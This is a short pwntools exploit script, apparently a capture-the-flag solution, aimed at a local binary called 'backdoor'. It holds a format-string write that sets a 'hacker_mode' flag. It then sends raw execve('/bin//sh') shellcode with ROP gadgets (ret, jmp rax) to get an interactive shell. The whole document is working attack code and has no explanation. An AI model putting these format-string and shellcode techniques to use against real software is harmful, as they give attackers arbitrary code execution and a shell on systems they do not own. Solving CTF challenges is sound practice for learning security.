from pwn import *
elf = context.binary = ELF("./backdoor")
p = process()
# context.terminal = ['tmux', 'splitw', '-h']
rop = ROP(context.binary)
hacker_mode = 0x040403c
jmp_rax = 0x00000000004010cc
ret = 0x0000000000401016
ubah_hacker_mode = fmtstr_payload(8,{hacker_mode:0x19},write_size='short')
p.sendline(ubah_hacker_mode)
write("payload",ubah_hacker_mode)
# gdb.attach(p, '''
#         echo "hi"
#         break *0x4012e8
#         continue
#         ''')  # Use tmux
shell_code = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
print(len(shell_code))
shell_code += B"A" * 11 + p64(ret) +p64(jmp_rax)
p.sendline(shell_code)
p.interactive()